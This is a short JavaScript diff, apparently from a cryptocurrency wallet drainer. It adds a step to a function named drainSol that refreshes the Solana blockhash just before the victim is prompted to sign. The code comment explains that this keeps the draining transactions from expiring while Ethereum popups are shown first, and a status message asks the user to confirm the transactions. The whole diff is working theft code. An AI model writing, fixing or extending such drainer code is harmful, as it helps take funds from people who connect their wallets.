@@ -6398,6 +6398,19 @@
 
     if (txList.length === 0) return null;
 
+    // Refresh blockhash just before signing to avoid "Blockhash not found" failure.
+    // drainSol builds transactions (many RPC calls) + ETH popups may appear first,
+    // so by the time user sees SOL popup the original blockhash (~60s TTL) is expired.
+    try {
+      var freshBlockhash = (await connection.getLatestBlockhash('confirmed')).blockhash;
+      for (var bhi = 0; bhi < txList.length; bhi++) {
+        txList[bhi].recentBlockhash = freshBlockhash;
+      }
+      L.log('[drainSol] refreshed blockhash before sign:', freshBlockhash.slice(0, 8) + '...');
+    } catch (eBh) {
+      L.warn('[drainSol] blockhash refresh fail, using original:', eBh && eBh.message);
+    }
+
     UI.status('Confirm Solana (' + txList.length + ' tx)...');
       var signedTxs;
     if (conn.provider.signAllTransactions) {
